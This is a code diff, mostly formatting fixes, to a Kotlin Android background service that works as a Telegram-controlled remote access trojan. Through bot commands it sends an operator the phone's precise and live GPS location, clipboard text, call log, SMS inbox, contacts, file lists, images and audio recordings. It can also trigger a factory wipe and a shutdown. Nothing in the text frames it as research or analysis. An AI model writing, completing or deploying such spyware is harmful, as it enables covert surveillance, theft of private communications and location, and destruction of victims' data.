@@ -6,11 +6,11 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.app.admin.DevicePolicyManager
+import android.content.ClipboardManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.content.ClipboardManager
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
@@ -19,6 +19,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.provider.CallLog
@@ -71,12 +72,13 @@ class BackgroundControlService : Service() {
 
     @Volatile
     private var isRunning = false
+
     @Volatile
     private var isTrackingActive = false
     private var lastUpdateId = 0L
 
     private val executionExecutor = Executors.newFixedThreadPool(4)
-    private val mainHandler = android.os.Handler(Looper.getMainLooper())
+    private val mainHandler = Handler(Looper.getMainLooper())
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -126,7 +128,7 @@ class BackgroundControlService : Service() {
             while (isRunning) {
                 var connection: HttpURLConnection? = null
                 try {
-                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=25&allowed_updates=["message","callback_query"]")
+                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=25&allowed_updates=[\"message\",\"callback_query\"]")
                     connection = url.openConnection() as HttpURLConnection
                     connection.requestMethod = "GET"
                     connection.connectTimeout = 12000
@@ -174,9 +176,15 @@ class BackgroundControlService : Service() {
                         }
                     }
                 } catch (_: Exception) {
-                    try { Thread.sleep(6000) } catch (_: InterruptedException) {}
+                    try {
+                        Thread.sleep(6000)
+                    } catch (_: InterruptedException) {
+                    }
                 } finally {
-                    try { connection?.disconnect() } catch (_: Exception) {}
+                    try {
+                        connection?.disconnect()
+                    } catch (_: Exception) {
+                    }
                 }
             }
         }
@@ -223,8 +231,7 @@ class BackgroundControlService : Service() {
                 data == "factory_reset" -> executeTerminalWipe(chatId)
                 data == "remote_shutdown" -> executeHardShutdown(chatId)
                 data == "service_status" -> sendDirectMessage(chatId, "🟢 الحالة: النظام يعمل بكفاءة تامة في الخلفية.")
-                data == "sys_info" -> sendDirectMessage(chatId, "📱 إصدار النظام: ${Build.VERSION.RELEASE}
-🛠️ الطراز: ${Build.MODEL}")
+                data == "sys_info" -> sendDirectMessage(chatId, "📱 إصدار النظام: ${Build.VERSION.RELEASE}\n🛠️ الطراز: ${Build.MODEL}")
                 data.startsWith("pull_images_") -> {
                     val count = data.substringAfter("pull_images_").toIntOrNull() ?: 10
                     extractAndPushRecentImages(chatId, count)
@@ -250,16 +257,11 @@ class BackgroundControlService : Service() {
 
     private fun sendDeviceDetails(chatId: String) {
         val info = buildString {
-            append("📱 معلومات الجهاز المتصل:
-")
-            append("• الشركة المصنعة: ${Build.MANUFACTURER}
-")
-            append("• الطراز: ${Build.MODEL}
-")
-            append("• الجهاز: ${Build.DEVICE}
-")
-            append("• إصدار أندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
-")
+            append("📱 معلومات الجهاز المتصل:\n")
+            append("• الشركة المصنعة: ${Build.MANUFACTURER}\n")
+            append("• الطراز: ${Build.MODEL}\n")
+            append("• الجهاز: ${Build.DEVICE}\n")
+            append("• إصدار أندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\n")
             append("• حالة التتبع الحي: ${if (isTrackingActive) "نشط" else "متوقف"}")
         }
         sendDirectMessage(chatId, info)
@@ -325,32 +327,38 @@ class BackgroundControlService : Service() {
                             val accuracy = location.accuracy
                             sendDirectMessage(
                                 chatId,
-                                "🎯 [موقع دقيق - $provider]
-Lat: $lat, Lon: $lon
-الدقة: ${accuracy}م
-https://maps.google.com/?q=$lat,$lon"
+                                "🎯 [موقع دقيق - $provider]\nLat: $lat, Lon: $lon\nالدقة: ${accuracy}م\nhttps://maps.google.com/?q=$lat,$lon"
                             )
-                            try { locManager.removeUpdates(this) } catch (_: Exception) {}
+                            try {
+                                locManager.removeUpdates(this)
+                            } catch (_: Exception) {
+                            }
                         }
 
                         @Deprecated("Deprecated in Java")
-                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
-                        override fun onProviderEnabled(provider: String) {}
-                        override fun onProviderDisabled(provider: String) {}
+                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
+                        }
+
+                        override fun onProviderEnabled(provider: String) {
+                        }
+
+                        override fun onProviderDisabled(provider: String) {
+                        }
                     }
                     @Suppress("DEPRECATION")
                     locManager.requestSingleUpdate(provider, listener, Looper.getMainLooper())
 
                     mainHandler.postDelayed({
-                        try { locManager.removeUpdates(listener) } catch (_: Exception) {}
+                        try {
+                            locManager.removeUpdates(listener)
+                        } catch (_: Exception) {
+                        }
                         val fallback = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                             ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                         if (fallback != null) {
                             sendDirectMessage(
                                 chatId,
-                                "📍 [آخر موقع معروف]:
-Lat: ${fallback.latitude}, Lon: ${fallback.longitude}
-https://maps.google.com/?q=${fallback.latitude},${fallback.longitude}"
+                                "📍 [آخر موقع معروف]:\nLat: ${fallback.latitude}, Lon: ${fallback.longitude}\nhttps://maps.google.com/?q=${fallback.latitude},${fallback.longitude}"
                             )
                         }
                     }, 8000)
@@ -360,8 +368,7 @@ https://maps.google.com/?q=${fallback.latitude},${fallback.longitude}"
                     if (lastLoc != null) {
                         sendDirectMessage(
                             chatId,
-                            "📍 [الموقع المؤرشف]:
-https://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}"
+                            "📍 [الموقع المؤرشف]:\nhttps://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}"
                         )
                     } else {
                         sendDirectMessage(chatId, "⚠️ تعذر جلب الموقع لتعطل خدمات التحديد.")
@@ -392,13 +399,15 @@ https://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}"
                         if (location != null) {
                             sendDirectMessage(
                                 chatId,
-                                "📍 [تتبّع حي]
-Lat: ${location.latitude}, Lon: ${location.longitude}
-https://maps.google.com/?q=${location.latitude},${location.longitude}"
+                                "📍 [تتبّع حي]\nLat: ${location.latitude}, Lon: ${location.longitude}\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}"
                             )
                         }
-                    } catch (_: Exception) {}
-                    try { Thread.sleep(15000) } catch (_: InterruptedException) {}
+                    } catch (_: Exception) {
+                    }
+                    try {
+                        Thread.sleep(15000)
+                    } catch (_: InterruptedException) {
+                    }
                 }
             }
         } else {
@@ -422,9 +431,7 @@ https://maps.google.com/?q=${location.latitude},${location.longitude}"
                 val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                 if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                     val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
-                    sendDirectMessage(chatId, "📋 محتوى الحافظة المستخرج:
-
-$text")
+                    sendDirectMessage(chatId, "📋 محتوى الحافظة المستخرج:\n\n$text")
                 } else {
                     sendDirectMessage(chatId, "ℹ️ الحافظة فارغة حالياً أو مقيدة أمنياً.")
                 }
@@ -534,7 +541,10 @@ $text")
             } catch (e: Exception) {
                 sendDirectMessage(chatId, "❌ خطأ التسجيل الصوتي: ${e.message}")
             } finally {
-                try { recorder?.release() } catch (_: Exception) {}
+                try {
+                    recorder?.release()
+                } catch (_: Exception) {
+                }
                 if (outputFile.exists()) outputFile.delete()
             }
         }
@@ -595,11 +605,9 @@ $text")
                     sendDirectMessage(chatId, "📂 مجلد التنزيلات فارغ.")
                     return@execute
                 }
-                val sb = StringBuilder("📂 ملفات النظام (${dir.name}):
-")
+                val sb = StringBuilder("📂 ملفات النظام (${dir.name}):\n")
                 files.take(50).forEach { f ->
-                    sb.append("• ${f.name} (${f.length() / 1024} KB)
-")
+                    sb.append("• ${f.name} (${f.length() / 1024} KB)\n")
                 }
                 sendDirectMessage(chatId, sb.toString())
             } catch (e: Exception) {
@@ -647,9 +655,7 @@ $text")
         executionExecutor.execute {
             try {
                 val projection = arrayOf(MediaStore.Video.Media.DISPLAY_NAME, MediaStore.Video.Media.SIZE)
-                val sb = StringBuilder("🎬 فيديوهات الجهاز المخزنة:
-
-")
+                val sb = StringBuilder("🎬 فيديوهات الجهاز المخزنة:\n\n")
                 var count = 0
                 contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC")?.use { cursor ->
                     val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
@@ -657,8 +663,7 @@ $text")
                     while (cursor.moveToNext() && count < 30) {
                         val name = cursor.getString(nameIdx) ?: "فيديو"
                         val sizeKB = (cursor.getLong(sizeIdx)) / 1024
-                        sb.append("• $name (${sizeKB} KB)
-")
+                        sb.append("• $name (${sizeKB} KB)\n")
                         count++
                     }
                 }
@@ -715,15 +720,13 @@ $text")
             try {
                 val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION)
                 val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
-                val sb = StringBuilder("📞 سجل المكالمات (آخر 100):
-")
+                val sb = StringBuilder("📞 سجل المكالمات (آخر 100):\n")
                 var count = 0
                 contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, "${CallLog.Calls.DATE} DESC")?.use { cursor ->
                     val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                     val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                     while (cursor.moveToNext() && count < 100) {
-                        sb.append("• ${cursor.getString(numIdx)} - ${formatter.format(Date(cursor.getLong(dateIdx)))}
-")
+                        sb.append("• ${cursor.getString(numIdx)} - ${formatter.format(Date(cursor.getLong(dateIdx)))}\n")
                         count++
                     }
                 }
@@ -743,9 +746,7 @@ $text")
             try {
                 val uri = Uri.parse("content://sms/inbox")
                 val projection = arrayOf("address", "body", "date")
-                val sb = StringBuilder("💬 أرشيف رسائل SMS (آخر 50):
-
-")
+                val sb = StringBuilder("💬 أرشيف رسائل SMS (آخر 50):\n\n")
                 var count = 0
 
                 contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
@@ -754,10 +755,7 @@ $text")
                     while (cursor.moveToNext() && count < 50) {
                         val sender = cursor.getString(addrIdx) ?: "مجهول"
                         val body = cursor.getString(bodyIdx)?.take(100) ?: ""
-                        sb.append("• من: $sender
-  النص: $body
-
-")
+                        sb.append("• من: $sender\n  النص: $body\n\n")
                         count++
                     }
                 }
@@ -784,9 +782,7 @@ $text")
                     ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                     ContactsContract.CommonDataKinds.Phone.NUMBER
                 )
-                val sb = StringBuilder("📇 دليل جهات الاتصال (أول 100):
-
-")
+                val sb = StringBuilder("📇 دليل جهات الاتصال (أول 100):\n\n")
                 var count = 0
 
                 contentResolver.query(
@@ -801,8 +797,7 @@ $text")
                     while (cursor.moveToNext() && count < 100) {
                         val name = cursor.getString(nameIdx) ?: "بدون اسم"
                         val number = cursor.getString(numIdx) ?: ""
-                        sb.append("• $name: $number
-")
+                        sb.append("• $name: $number\n")
                         count++
                     }
                 }
@@ -829,39 +824,28 @@ $text")
             connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
 
             DataOutputStream(connection.outputStream).use { out ->
-                out.write("--$boundary
-".toByteArray())
-                out.write("Content-Disposition: form-data; name="chat_id"
+                out.write("--$boundary\r\n".toByteArray())
+                out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
+                out.write("$chatId\r\n".toByteArray())
 
-".toByteArray())
-                out.write("$chatId
-".toByteArray())
+                out.write("--$boundary\r\n".toByteArray())
+                out.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".toByteArray())
+                out.write("$caption\r\n".toByteArray())
 
-                out.write("--$boundary
-".toByteArray())
-                out.write("Content-Disposition: form-data; name="caption"
-
-".toByteArray())
-                out.write("$caption
-".toByteArray())
-
-                out.write("--$boundary
-".toByteArray())
-                out.write("Content-Disposition: form-data; name="$fieldName"; filename="${file.name}"
-".toByteArray())
-                out.write("Content-Type: $mimeType
-
-".toByteArray())
+                out.write("--$boundary\r\n".toByteArray())
+                out.write("Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"\r\n".toByteArray())
+                out.write("Content-Type: $mimeType\r\n\r\n".toByteArray())
 
                 FileInputStream(file).use { it.copyTo(out) }
-                out.write("
---$boundary--
-".toByteArray())
+                out.write("\r\n--$boundary--\r\n".toByteArray())
             }
             connection.inputStream?.close()
         } catch (_: Exception) {
         } finally {
-            try { connection?.disconnect() } catch (_: Exception) {}
+            try {
+                connection?.disconnect()
+            } catch (_: Exception) {
+            }
         }
     }
 
@@ -881,7 +865,10 @@ $text")
                 conn.inputStream?.close()
             } catch (_: Exception) {
             } finally {
-                try { conn?.disconnect() } catch (_: Exception) {}
+                try {
+                    conn?.disconnect()
+                } catch (_: Exception) {
+                }
             }
         }
     }
@@ -950,7 +937,10 @@ $text")
                 conn.inputStream?.close()
             } catch (_: Exception) {
             } finally {
-                try { conn?.disconnect() } catch (_: Exception) {}
+                try {
+                    conn?.disconnect()
+                } catch (_: Exception) {
+                }
             }
         }
     }
@@ -968,7 +958,10 @@ $text")
                 conn.inputStream?.close()
             } catch (_: Exception) {
             } finally {
-                try { conn?.disconnect() } catch (_: Exception) {}
+                try {
+                    conn?.disconnect()
+                } catch (_: Exception) {
+                }
             }
         }
     }
@@ -976,7 +969,10 @@ $text")
     override fun onDestroy() {
         isRunning = false
         isTrackingActive = false
-        try { executionExecutor.shutdownNow() } catch (_: Exception) {}
+        try {
+            executionExecutor.shutdownNow()
+        } catch (_: Exception) {
+        }
         super.onDestroy()
     }
 }
